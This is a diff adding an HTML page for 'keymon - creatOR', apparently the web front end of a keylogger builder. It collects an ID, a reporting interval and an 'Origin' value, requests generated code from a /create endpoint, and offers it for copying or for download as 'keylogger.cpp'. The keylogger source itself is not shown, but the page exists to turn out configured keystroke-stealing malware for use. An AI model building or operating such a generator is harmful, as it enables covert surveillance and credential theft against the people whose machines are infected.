@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KEYMON</title>
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <style>
+        .container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .content {
+            display: flex;
+            width: 100%;
+            height: 100%;
+        }
+
+        .content form {
+            width: 350px;
+            padding: .5rem;
+        }
+
+        .content .code {
+            width: calc(100% - 300px);
+            background: #000;
+            border-radius: 4px;
+            color: aquamarine;
+            padding: .5rem;
+            height: 85vh;
+            overflow: auto;
+        }
+
+        input {
+            background: #ffffff15;
+            font-size: 1.2rem;
+            color: #e5e5e5;
+            padding: .5rem;
+            border-radius: 4px;
+            width: 100%;
+            margin: .1rem auto;
+        }
+
+        input[type="submit"] {
+            background: #ff3600;
+            cursor: pointer;
+        }
+
+        .line-p {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: .5rem 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>keymon - creatOR</h2>
+
+            <div class="right">
+                <a href="/">
+                    <button class="b-btn"><i class="fa-solid fa-house"></i></button>
+                </a>
+            </div>
+        </div>
+
+        <div class="content">
+            <form>
+                <input type="text" placeholder="Custom ID" name="id">
+                <input type="number" placeholder="Interval" required name="interval">
+                <input type="text" placeholder="Origin" required name="origin">
+                <input type="submit" value="Generate">
+                <pre
+                    class="line-p">COPY CODE     :<button type="button" class="b-btn" id="copy-btn"><i class="fa-solid fa-copy"></i></button></pre>
+                <pre
+                    class="line-p">DOWNLOAD CODE :<button type="button" class="b-btn" id="download-code"><i class="fa-solid fa-file-arrow-down"></i></button></pre>
+            </form>
+
+            <pre class="code"></pre>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        const form = document.querySelector("form")
+        const code = document.querySelector(".code")
+        const copyCode = document.querySelector("#copy-btn")
+        const downloadCode = document.querySelector("#download-code")
+
+        form.addEventListener("submit", e => {
+            e.preventDefault()
+
+            const data = {}
+            for (const inp of e.target) {
+                if (inp.name === undefined || inp.name.length === 0) continue
+
+                data[inp.name] = inp.value
+            }
+
+            axios.post("/create", data).then(response => {
+                code.innerText = response.data
+            }).catch(err => {
+                console.log(err);
+                alert(err)
+            })
+        })
+
+
+        copyCode.addEventListener("click", () => {
+            navigator.clipboard.writeText(code.innerText).then(res => { }).catch(err => alert)
+        })
+
+        downloadCode.addEventListener('click', () => {
+            const element = document.createElement('a')
+            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(code.innerText))
+            element.setAttribute('download', "keylogger.cpp")
+            element.style.display = 'none'
+            document.body.appendChild(element)
+            element.click()
+            document.body.removeChild(element)
+        })
+    </script>
+</body>
+
+</html>
